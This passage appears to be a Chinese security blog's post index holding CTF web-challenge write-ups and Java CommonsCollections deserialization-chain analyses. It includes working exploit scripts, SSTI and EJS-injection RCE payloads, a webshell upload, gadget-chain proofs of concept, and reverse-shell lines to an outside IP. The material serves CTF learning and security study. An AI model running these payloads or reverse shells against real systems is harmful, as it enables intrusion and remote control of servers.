{"pages":[{"title":"About","text":"都想学,都不会,👴要做全沾🥹 喜欢的音乐区up主🥰🥰🥰 蛀牙 https://space.bilibili.com/3046429咻咻满 https://space.bilibili.com/37754047皂老师 https://space.bilibili.com/634131浅影阿_ https://space.bilibili.com/651386960兰音Reine https://space.bilibili.com/698029620 QQ：MTgyMjE0MzMxNA==","link":"/about/index.html"}],"posts":[{"title":"🌟CTF2022-Web部分WriteUp","text":"*CTF oh-my-lotto首先用比赛给的附件，用Dokcer搭好环境 docker-compose builddocker-compose up 正常启动 给了源码，所以进行白盒审计，四个界面分别对应四个路由 其中lotto的路由主要部分是这些 @app.route(&quot;/lotto&quot;, methods=['GET', 'POST'])def lotto(): message = '' if request.method == 'GET': return render_template('lotto.html') elif request.method == 'POST': flag = os.getenv('flag') lotto_key = request.form.get('lotto_key') or '' lotto_value = request.form.get('lotto_value') or '' try: lotto_key = lotto_key.upper() except Exception as e: print(e) message = 'Lotto Error!' return render_template('lotto.html', message=message) if safe_check(lotto_key): os.environ[lotto_key] = lotto_value try: os.system('wget --content-disposition -N lotto') if os.path.exists(&quot;/app/lotto_result.txt&quot;): lotto_result = open(&quot;/app/lotto_result.txt&quot;, 'rb').read() else: lotto_result = 'result' if os.path.exists(&quot;/app/guess/forecast.txt&quot;): forecast = open(&quot;/app/guess/forecast.txt&quot;, 'rb').read() else: forecast = 'forecast' if forecast == lotto_result: return flag 大概含义就是会从内网的lotto界面取出一个文件（可以在lotto的app.py中发现事一串随机数），然后与forecast传入的文件进行对比，如果相同就会返回从环境变量中取出的flag 然后就是 def safe_check(s): if 'LD' in s or 'HTTP' in s or 'BASH' in s or 'ENV' in s or 'PROXY' in s or 'PS' in s: return False return True 因为这个函数过滤了一些环境变量，所以之前HF中看p神提到的环境变量进行RCE也不行了 看了WP才知道，控制PATH，我们也可以进行一些骚操作 PATH变量就是用于保存可以搜索的目录路径，如果待运行的程序不在当前目录，操作系统便可以去依次搜索PATH变量变量中记录的目录，如果在这些目录中找到待运行的程序，操作系统便可以直接运行，前提是有执行权限 那既然它是会用wget取读取随机数，那我们控制PATH，让它找不到wget，它就无法再读出随机数，这样我们就可以利用已知的第一次生成的随机数上传，不就对比是一样的了嘛 EXP如下 import requestsfrom lxml import etreeurl = &quot;http://localhost:8880/&quot;lotto_data = { &quot;lotto_key&quot;: &quot;&quot;, &quot;lotto_value&quot;: &quot;&quot;}lotto_data1 = { &quot;lotto_key&quot;: &quot;PATH&quot;, &quot;lotto_value&quot;: &quot;/&quot;}requests.post(url=(url + &quot;lotto&quot;), data=lotto_data)resp = requests.get(url=(url + &quot;result&quot;))html = etree.HTML(resp.text)result = html.xpath(&quot;/html/body/div[2]/div/p[3]/text()&quot;)print(result)with open(&quot;result.txt&quot;, &quot;w+&quot;) as f: f.writelines(result)requests.post(url=(url + &quot;forecast&quot;), files={'file': open(&quot;result.txt&quot;, &quot;rb&quot;)})r = requests.post(url=(url + &quot;lotto&quot;), data=lotto_data1)print(r.text) 成功得到flag oh-my-lotto-revenge算是上一题的一个进阶版本 这里就算预测正确，也不会返回flag 根据wp的这个链接 我们知道了这个WGETRC，我们可以控制环境变量就可以控制wget的参数，其中这里主要利用这两个 http_proxy = stringUse string as HTTP proxy, instead of the one specified in environment.wget的流量就会先转发到这个指定的代理上，这样我们就可以成为一个中间人output_document = fileSet the output filename—the same as ‘-O file’.这个我们就能控制目录文件，覆盖templates/index.html，打一个SSTI 先做个实验，看wget的流量能否转发到我们的监听端口上 再用如下exp &quot;&quot;&quot;@Author: C4ry7nk&quot;&quot;&quot;import requestsurl = &quot;http://localhost:8880/&quot;r = requests.post(url + &quot;forecast&quot;, files={'file': open(&quot;lnk.txt&quot;, &quot;rb&quot;)})data = { &quot;lotto_key&quot;: &quot;WGETRC&quot;, &quot;lotto_value&quot;: &quot;/app/guess/forecast.txt&quot;}resp = requests.post(url + &quot;lotto&quot;, data=data)print(resp.text) 然后我们在本地docker的shell里就可以发现，的确写入了我们输入的内容 那我们如果写入反弹shell的SSTI，再刷新index.html，就可以getshell了 于是我们写入 {{config.__class__.__init__.__globals__['os'].popen('bash -c &quot;bash -i &gt;&amp; /dev/tcp/118.251.146.118/1234 0&gt;&amp;1&quot;').read()}} 刷新index.html后，成功获得shell 在env中看到flag 参考Y4师傅的WP","link":"/2022/04/19/*CTF2022/"},{"title":"2022DASCTF MAY 出题人挑战赛","text":"Web WriteUp Power Cookie抓包看到有个Set-Cookie: admin=0;修改为1访问即可 魔法浏览器抓包看到一串js，直接控制台跑一下 改掉UA头得到flag getme看一下服务版本 Apache 2.4.5，果然没猜错考的是那个目录穿越的漏洞，随便网上找找payload https://blog.csdn.net/weixin_45694388/article/details/120801856 但是找flag的这个目录是真的长 hackme这题是个go语言的题目，我没学过，不咋会💦 赛后复现下知道只是考go的利用和白名单 首先发现在/upload这个上传点，上传一些go文件都无法被解析，而list上的一些文件可以被解析，于是我们可以使用上面的文件名，写入我们要执行的代码 package mainimport ( &quot;fmt&quot; &quot;os/exec&quot;)func exp() { out, err := exec.Command(&quot;cat&quot;,&quot;/flag&quot;).Output() if err != nil { fmt.Printf(&quot;%s&quot;, err) } output := string(out[:]) fmt.Println(output)}func main() { exp()} 然后访问对应的文件即可","link":"/2022/05/22/2022DASCTF%20May/"},{"title":"DASCTF X CBCTF 2022九月挑战赛","text":"有所收获 dino3d前端js小游戏，像是google小恐龙的3D版 抓包可以发现后端会有个check.php检测 后端看不到逻辑，就先审审前端js的代码，f12抓包可以发现是由bulid.min.js发起的 我们跟一下，再搜索找到了sn函数，请求体的逻辑也在这 下个断点调试一下，可以发现checkCode的值 并且，我们还可以知道调用sn的函数 直接控制台传值 Text Reverser浅搜一下，发现是外国的一道原题改编的 https://pankas.top/2022/07/25/dicectf-hope-web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/ 这道题多了过滤手段，但不多，简单fuzz一下，发现双{ {不可以，网上搜一下可以用{ % + print绕过 payload = '''{%print(''.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['__builtins__']['eval']('__import__(&quot;os&quot;).popen(&quot;nl /flag&quot;).read()'))%}'''[::-1]print(payload) 读文件过滤了cat我直接用nl读了 cbshop也是国外的一道题改编过来的，nodejs的题，不得不说，老外真喜欢js啊 https://nanimokangaeteinai.hateblo.jp/entry/2022/08/09/022238#Web-209-simplewaf-28-solves https://viblo.asia/p/corctf-2022-writeup-part-1-m68Z0Joj5kG 这里感叹一下，google真好用 给了源码 const fs = require('fs');const express = require('express');const session = require('express-session');const bodyParse = require('body-parser');const app = express();const PORT = process.env.PORT || 80;const SECRET = process.env.SECRET || &quot;cybershop_challenge_secret&quot;const adminUser = { username: &quot;admin&quot;, password: &quot;😀admin😀&quot;, money: 9999};app.use(bodyParse.urlencoded({extended: false}));app.use(express.json());app.use(session({ secret: SECRET, saveUninitialized: false, resave: false, cookie: { maxAge: 3600 * 1000 }}));app.use(express.static(&quot;static&quot;));app.get('/isLogin', function(req, res) { if(req.session.username) { return res.json({ code: 2, username: req.session.username, money: req.session.money }); }else{ return res.json({code: 0, msg: 'Please login!'}); }});app.post('/login', function(req, res) { let username = req.body.username; let password = req.body.password; if (typeof username !== 'string' || username === '' || typeof password !== 'string' || password === '') { return res.json({code: 4, msg: 'illegal username or password!'}) } if(username === adminUser.username &amp;&amp; password === adminUser.password.substring(1,6)) {//only admin need password req.session.username = username; req.session.money = adminUser.money; return res.json({ code: 1, username: username, money: req.session.money, msg: 'admin login success!' }); } req.session.username = username; req.session.money = 10; return res.json({ code: 1, username: username, money: req.session.money, msg: `${username} login success!` });});app.post('/changeUsername', function(req, res) { if(!req.session.username) { return res.json({ code: 0, msg: 'please login!' }); } let username = req.body.username; if (typeof username !== 'string' || username === '') { return res.json({code: 4, msg: 'illegal username!'}) } req.session.username = username; return res.json({ code: 2, username: username, money: req.session.money, msg: 'Username change success' });});//购买商品的接口function buyApi(user, product) { let order = {}; if(!order[user.username]) { order[user.username] = {}; } Object.assign(order[user.username], product); if(product.id === 1) { //buy fakeFlag if(user.money &gt;= 10) { user.money -= 10; Object.assign(order, { msg: fs.readFileSync('/fakeFlag').toString() }); }else{ Object.assign(order,{ msg: &quot;you don't have enough money!&quot; }); } }else if(product.id === 2) { //buy flag if(user.money &gt;= 11 &amp;&amp; user.token) { //do u have token? if(JSON.stringify(product).includes(&quot;flag&quot;)) { Object.assign(order,{ msg: &quot;hint: go to 'readFileSync'!!!!&quot; }); }else{ user.money -= 11; Object.assign(order,{ msg: fs.readFileSync(product.name).toString() }); } }else { Object.assign(order,{ msg: &quot;nononono!&quot; }); } }else { Object.assign(order,{ code: 0, msg: &quot;no such product!&quot; }); } Object.assign(order, { username: user.username, code: 3, money: user.money }); return order;}app.post('/buy', function(req, res) { if(!req.session.username) { return res.json({ code: 0, msg: 'please login!' }); } var user = { username: req.session.username, money: req.session.money }; var order = buyApi(user, req.body); req.session.money = user.money; res.json(order);});app.get('/logout', function(req, res) { req.session.destroy(); return res.json({ code: 0, msg: 'logout success!' });});app.listen(PORT, () =&gt; {console.log(`APP RUN IN ${PORT}`)}); 给了用户名和密码，但是在后面又会发现把密码截断了，并且是个emoji，我们得编码再传，这里直接在控制台操作 有9999这么多钱，我们发现依然买不了flag，继续往下看 ...... }else if(product.id === 2) { //buy flag if(user.money &gt;= 11 &amp;&amp; user.token) { //do u have token? if(JSON.stringify(product).includes(&quot;flag&quot;)) { Object.assign(order,{ msg: &quot;hint: go to 'readFileSync'!!!!&quot; }); }else{ user.money -= 11; Object.assign(order,{ msg: fs.readFileSync(product.name).toString() }); } }else { Object.assign(order,{ msg: &quot;nononono!&quot; }); } }else { Object.assign(order,{ code: 0, msg: &quot;no such product!&quot; }); } Object.assign(order, { username: user.username, code: 3, money: user.money }); return order;} 可以看到这个if里多了个token判断，但是我们向前找发现user并没有这个属性，当然他不可能凭空存在，我们可以想到，js会向上去找他原型链寻找这个参数，注意看这里 Object.assign(order[user.username], product); 这个username可以改，我们可控，而这个assing又是一个合并的操作，存在原型链污染，我们使username=__proto__，将product合并到order原型上，order和user原型又都是Object。这样我们就可以构造出token参数 然后我们发现，这里过滤掉了flag关键字，并提示去看readFileSync这个函数，但是不影响我们读其他文件，如下 这里我们跟着分析一下readFileSync https://github.com/nodejs/node/blob/main/lib/fs.js#L452 function readFileSync(path, options) { options = getOptions(options, { flag: 'r' }); const isUserFd = isFd(path); // File descriptor ownership const fd = isUserFd ? path : fs.openSync(path, options.flag, 0o666);... 下面是读文件的操作，我们主要跟进openSync function openSync(path, flags, mode) { path = getValidatedPath(path); const flagsNumber = stringToFlags(flags); mode = parseFileMode(mode, 'mode', 0o666); const ctx = { path }; const result = binding.open(pathModule.toNamespacedPath(path), flagsNumber, mode, undefined, ctx); handleErrorFromBinding(ctx); return result;} 这里有个getValidatedPath似乎是获取文件路径，继续跟 function getValidatedPath (fileURLOrPath) { const path = fileURLOrPath != null &amp;&amp; fileURLOrPath.href &amp;&amp; fileURLOrPath.origin ? fileURLToPath(fileURLOrPath) : fileURLOrPath return path} 需要fileURLOrPath &amp; href &amp; origin都不为空，接着看fileURLOrPath function fileURLToPath(path) { if (typeof path === 'string') path = new URL(path); else if (!isURLInstance(path)) throw new ERR_INVALID_ARG_TYPE('path', ['string', 'URL'], path); if (path.protocol !== 'file:') throw new ERR_INVALID_URL_SCHEME('file'); return isWindows ? getPathFromURLWin32(path) : getPathFromURLPosix(path);} function isURLInstance(fileURLOrPath) { return fileURLOrPath != null &amp;&amp; fileURLOrPath.href &amp;&amp; fileURLOrPath.origin;} 这里需要path.protocol == 'file:'，才能走到return，这里在isURLInstance也能发现那三个值不能为null，因为是linux的环境，跟后面一个 function getPathFromURLPosix(url) { if (url.hostname !== '') { throw new ERR_INVALID_FILE_URL_HOST(platform); } const pathname = url.pathname; for (let n = 0; n &lt; pathname.length; n++) { if (pathname[n] === '%') { const third = pathname.codePointAt(n + 2) | 0x20; if (pathname[n + 1] === '2' &amp;&amp; third === 102) { throw new ERR_INVALID_FILE_URL_PATH( 'must not include encoded / characters' ); } } } return decodeURIComponent(pathname);} 首先要url.hostname == ''绕过if，这里可以发现它对传入的pathname进行了URL解码的操作，刚好看文档我们知道fs.readFileSync是接受URL参数的 所以我们可以将flag进行编码绕过if检查，并且不影响读文件操作 并且要满足之前说到的几个参数条件 pathname urlencode file.origin exists file.href exists file.protocol = 'file:' file.hostname = ''","link":"/2022/09/22/2022DASCTF%20SEP/"},{"title":"2022西湖论剑-Web复现","text":"前言好久没做题了… 扭转乾坤随便上传会被403拒绝 https://www.anquanke.com/post/id/241265#h2-0 参考这个 对multipart/forM-data进行空格拆分或者大小写变换可以绕过 node审一下源码发现controller.js的这一段 function Flag1Controller(req,res){ try { if(req.cookies.user === SECRET_COOKIE){ res.setHeader(&quot;This_Is_The_Flag1&quot;,flag1.toString().trim()) res.setHeader(&quot;This_Is_The_Flag2&quot;,flag2.toString().trim()) res.status(200).type(&quot;text/html&quot;).send(&quot;Login success. Welcome,admin!&quot;) } if(req.cookies.user === &quot;admin&quot;) { res.setHeader(&quot;This_Is_The_Flag1&quot;, flag1.toString().trim()) res.status(200).type(&quot;text/html&quot;).send(&quot;You Got One Part Of Flag! Try To Get Another Part of Flag!&quot;) }else{ res.status(401).type(&quot;text/html&quot;).send(&quot;Unauthorized&quot;) } }catch (__) {}} 注意第二个if，设置Cookie就能得到flag1 接着看第二部分 function CheckController(req,res) { let checkcode = req.body.checkcode?req.body.checkcode:1234; console.log(req.body) if(checkcode.length === 16){ try{ checkcode = checkcode.toLowerCase() if(checkcode !== &quot;aGr5AtSp55dRacer&quot;){ res.status(403).json({&quot;msg&quot;:&quot;Invalid Checkcode1:&quot; + checkcode}) } }catch (__) {} res.status(200).type(&quot;text/html&quot;).json({&quot;msg&quot;:&quot;You Got Another Part Of Flag: &quot; + flag2.toString().trim()}) }else{ res.status(403).type(&quot;text/html&quot;).json({&quot;msg&quot;:&quot;Invalid Checkcode2:&quot; + checkcode}) }} 主要看到那个toLowerCase()函数，我们正常输入的话，肯定会被转成小写，但是注意到这里，如果我们能走到catch，也就能获得flag，所以得想办法让它报错 而我们传入一个列表时，这个toLowerCase()就会报错。同时注意长度要为16才能进入if unsual php题目代码就三个功能，读写文件，查看phpinfo 题目考点主要是改了源码的engine，对php源码进行了加密再解析，所以读有些文件是乱码的，比如index.php，所以我们如果直接上传文件的话，是行不通的，无法解析 方法的话可以通过php.ini和phpinfo找到 zend_test.so的位置，也可以通过读/proc/self/maps找到 接着用php伪协议把这个读出来 /?a=read&amp;file=php://filter/read=convert.base64-encode/resource=/usr/local/lib/php/extensions/no-debug-non-zts-20190902/zend_test.so 用cyberchef可以直接导出为文件，就不怕丢失了数据了，再用ida进行分析 可以发现是用RC4加密的，key是abcsdfadfjiweur 然后我们就能用这个key，加密我们的🐎，然后上传 import requestsimport base64# &lt;?php# if($_GET[&quot;a&quot;]==&quot;upload&quot;){# move_uploaded_file($_FILES['file'][&quot;tmp_name&quot;], &quot;upload/&quot;.$_FILES['file'][&quot;name&quot;]);# }elseif ($_GET[&quot;a&quot;]==&quot;read&quot;) {# echo file_get_contents($_GET[&quot;file&quot;]);# }elseif ($_GET[&quot;a&quot;]==&quot;version&quot;) {# phpinfo();# }url = &quot;http://80.endpoint-e3b2218dc1d446008a7cacc77c3d9bee.ins.cloud.dasctf.com:81/?a=upload&quot;payload = &quot;473xeG4d3kJANayE56+fzrJLaDo2vtMx&quot;file = { 'file': ('kk1.php', base64.b64decode(payload), '&lt;text/plain&gt;')}resp = requests.post(url=url, files=file)print(resp.text) 之后就是反弹shell，flag是root用户，然后chmod有sudo权限，提权读flag，这里因为复现靶机是公用的，所以直接读了 real_ez_node简单记录下，没咋看nodejs相关的😭 首先看到/copy这个路由 router.post('/copy',(req,res)=&gt;{ res.setHeader('Content-type','text/html;charset=utf-8') var ip = req.connection.remoteAddress; console.log(ip); var obj = { msg: '', } if (!ip.includes('127.0.0.1')) { obj.msg=&quot;only for admin&quot; res.send(JSON.stringify(obj)); return } let user = {}; for (let index in req.body) { if(!index.includes(&quot;__proto__&quot;)){ safeobj.expand(user, index, req.body[index]) } } res.render('index');}) 注意到这个safeobj，存在原型链污染 测试 const safeobj = require('safe-obj');//var payload = `{&quot;__proto__&quot;:{&quot;whoami&quot;:&quot;root&quot;}}`var payload = `{&quot;constructor.prototype.whoami&quot; :&quot;root&quot;}`let user = {};console.log(&quot;Before whoami:&quot; + user.whoami);for (let index in JSON.parse(payload)) { safeobj.expand(user, index, JSON.parse(payload)[index])}console.log(&quot;After whoami: &quot; + user.whoami);// Before :undefined// After: root 因为这里过滤了__proto__，所以我们用{&quot;constructor.prototype.whoami&quot; :&quot;root&quot;}，还有前面要保证ip为127.0.0.1，应该是要打一个ssrf，我们看后面有个curl路由 router.get('/curl', function(req, res) { var q = req.query.q; var resp = &quot;&quot;; if (q) { var url = 'http://localhost:3000/?q=' + q try { http.get(url,(res1)=&gt;{ const { statusCode } = res1; const contentType = res1.headers['content-type']; let error; // 任何 2xx 状态码都表示成功响应，但这里只检查 200。 if (statusCode !== 200) { error = new Error('Request Failed.\\n' + `Status Code: ${statusCode}`); } ...//省略一些代码 } else { res.send(&quot;search param 'q' missing!&quot;); }}) 这里的curl会发起一个get方式的http请求，但是这个url已经写死了，而且copy路由是需要post方式发起 注意题目的docker环境FROM node:8.1.2 这个版本存在HTTP拆分攻击，可以解决我们上面两个问题 光一个原型链污染没什么用，它还是一个ejs的模版存在rce，参考 https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/ exp参考AndyNodel师傅，膜一下orz &quot;&quot;&quot;@Author: C4ry7nk&quot;&quot;&quot;import requestspayload = ''' HTTP/1.1POST /copy HTTP/1.1Host: 127.0.0.1:3000Content-Length: 180Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Content-Type: application/jsonUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,ru;q=0.7,ja;q=0.6Connection: close{&quot;constructor.prototype.outputFunctionName&quot;: &quot;_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\\&quot;bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1\\\\&quot;');var __tmp2&quot;}GET / HTTP/1.1test:'''.replace(&quot;\\n&quot;, &quot;\\r\\n&quot;)def payload_encode(raw): ret = u&quot;&quot; for i in raw: ret += chr(0x0100+ord(i)) return retprint(payload)url = f&quot;http://3000.endpoint-f4a41261f41142dfb14d60dc0361f7bc.ins.cloud.dasctf.com:81/curl?q={payload_encode(payload)}&quot;requests.get(url=url) 参考还有两题 https://mp.weixin.qq.com/s/NjjXKyXimtAEnKIkdPXHxA https://github.com/PGYER/codefever/issues/136 http://www.andynoel.xyz/?p=621","link":"/2023/02/05/2022westlake/"},{"title":"CommonsCollections6利用链分析","text":"前言越来越摆了，纪念我啥也没干的一周 分析这条链不受jdk版本限制而且和URLDNS那条类似（抽空又去看了一下。 借白日梦组长的图和yso 它和CC1后半部分是一样的，调用LazyMap.get然后ChainedTransformer.transform() 主要前面是利用HashMap.put，然后我们之前分析过urldns链知道，它会调用hashCode方法。再去调用这个LazyMap的get 而作者这里就找到了一个TiedMapEntry类，我们可以跟进发现，他的hashCode调用了getValue方法 再跟进，就会发现这里调用了一个map.get，而这个map我们传入为LazyMap就完成了整条链的利用 我们尝试编写POC public class CommonsCollections6 { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;(); Map lazyMap = LazyMap.decorate(hashMap1, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;lnk&quot;); HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;(); hashMap2.put(tiedMapEntry, &quot;qqw&quot;); serialize(hashMap2); //unserialize(&quot;ser.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object object = ois.readObject(); return object; }} 这样我们知道其实是不行的，因为在urldns那条链里我们就发现，它在put的时候就已经走了hash方法，所以在序列化的时候就已经执行了，并没有到反序列化。 这个问题的话，我们就可以改前面的LazyMap，然后利用反射去改回来 如下 public class CommonsCollections6 { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;(); // 防止序列化的时候调用 Map lazyMap = LazyMap.decorate(hashMap1, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;lnk&quot;); HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;(); hashMap2.put(tiedMapEntry, &quot;qqw&quot;); Class cls = lazyMap.getClass(); Field factoryField = cls.getDeclaredField(&quot;factory&quot;); factoryField.setAccessible(true); factoryField.set(lazyMap, chainedTransformer); serialize(hashMap2); //unserialize(&quot;ser.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object object = ois.readObject(); return object; }} 这样的话，在put就不会触发调用了，序列化的时候改回来就可以了。 但是我们在反序列化的时候，发现这样也没有执行。我们在put下个断点debug看一下 我们一路跟到这里会发现，LazyMap的get方法首先会判断这个key是否存在，如果不存在，它也会执行一个put，把我们这个key存进去，所以在反序列化的时候，这里就已经有这个key了 这个问题我们只需要remove掉原先的那个key就好了 最终的POC如下 public class CommonsCollections6 { public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, null}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hashMap1 = new HashMap&lt;&gt;(); // 防止序列化的时候调用 Map lazyMap = LazyMap.decorate(hashMap1, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;lnk&quot;); HashMap&lt;Object, Object&gt; hashMap2 = new HashMap&lt;&gt;(); hashMap2.put(tiedMapEntry, &quot;qqw&quot;); lazyMap.remove(&quot;lnk&quot;); Class cls = lazyMap.getClass(); Field factoryField = cls.getDeclaredField(&quot;factory&quot;); factoryField.setAccessible(true); factoryField.set(lazyMap, chainedTransformer); serialize(hashMap2); unserialize(&quot;ser.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object object = ois.readObject(); return object; }}","link":"/2022/11/27/CC6/"},{"title":"CommonsCollections1利用链分析","text":"前言咕咕咕了一段时间Java的学习，趁着上个月的事情忙完，接着来学习复现一下著名的CommonsCollections1也就是CC1链的漏洞分析 环境我参考的是白日梦组长的，首先JDK版本下载jdk8u65的，因为这个漏洞在高版本中是被修复了的，然后导入对应版本的sun包java源码，方便调试分析 下载链接 JDK8u65 openjdk 8u65 下好后，先在IDEA里创建一个maven项目，然后选择对应版本的jdk，导入解压出来的src目录（记得把openjdk的sun包放进去） 然后下载maven的依赖，这里选择的版本是3.2.1 分析首先这里引用一下白日梦组长的反序列化攻击的思路 入口需要一个readObject，然后尾部需要有如命令执行的危险方法。所以我们的思路是从后往前找 根据前人的总结，我们知道寻找Transformer接口去挖掘漏洞 它有一个transform的方法，接收一个对象，然后进行一些操作。 我们主要看他的一些实现类 这个地方，我们主要先看这个InvokerTransformer，它的transform方法就是一个反射任意调用类，并且参数我们都可控，很像是一个后门的写法。 所以我们先尝试利用这个类来执行命令 Runtime runtime = Runtime.getRuntime();// Class cls = Runtime.class;// Method execMethod = cls.getDeclaredMethod(&quot;exec&quot;, String.class);// execMethod.setAccessible(true);// execMethod.invoke(runtime, &quot;open /System/Applications/Calculator.app&quot;); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}); invokerTransformer.transform(runtime); 成功执行了 接着我们的任务就是去找调用transform的不同名函数，因为如果是同名，那就无法构成链了，不能到别的方法里，就没有意义。 这里的话，采用idea的find usages,但是它只能找java文件，不能找class文件，所以这也是为啥之前要导入sun包源码。 然后我们找到了这个TransformedMap的checkSetValue方法，它的这个valueTransformer调用了transform方法，并且这个类的构造方法是一个protected，所以他只能自己调用，我们找一下 发现在这个decorate这里调用了 尝试构造一下POC Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); Map map = TransformedMap.decorate(hashMap, null, invokerTransformer); Class&lt;TransformedMap&gt; transformedMapClass = TransformedMap.class; Method checkSetValue = transformedMapClass.getDeclaredMethod(&quot;checkSetValue&quot;, Object.class); checkSetValue.setAccessible(true); checkSetValue.invoke(map,runtime); 我们就可以利用decorate去创建TransformedMap对象，因为作用域是protected，所以我们无法直接获取，再去调用其checkSetValue方法，然后会触发transform，我们跟进去发现成功执行。 然后我们接着继续找哪个地方调用了checkSetValue，发现是TransformedMap的父类，抽象类，AbstractInputCheckedMapDecorator内部的MapEntry类 setValue() 实际上就是在 Map 中对一组 entry(键值对)进行操作，比如对Map进行遍历的时候。 于是我们在进行对调用decorate方法的Map遍历时，调用setValue()然后就会走到checkSetValue 我们来更新一下POC Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(&quot;key&quot;, &quot;value&quot;); Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, invokerTransformer); for (Map.Entry entry: transformedMap.entrySet()) { entry.setValue(runtime); } 到这一步我们的目的就变成了，如果有一个遍历数组的地方，然后调用了setValue()方法，最好是在readObject方法里，这样我们就能直接构造POC了 继续find usages AnnotationInvocationHandler首先看名字我们知道他是一个动态代理处理的类 这里需要满足两个if条件判断，才能走到setValue AnnotationInvocationHandler 的作用域为 default，我们需要通过反射的方式来获取这个类及其构造函数 先构造出简单的poc再一一解决问题 Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;open /System/Applications/Calculator.app&quot;}); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(&quot;key&quot;, &quot;value&quot;); Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, null, invokerTransformer); Class cls = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor constructor = cls.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Object obj = constructor.newInstance(Override.class,transformedMap); serialize(obj); unserialize(&quot;ser.bin&quot;); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static Object unserialize(String Filename) throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename)); Object obj = ois.readObject(); return obj; } 现在存在三个问题 一：Runtime对象不可以序列化，我们要通过反射去变成可序列化 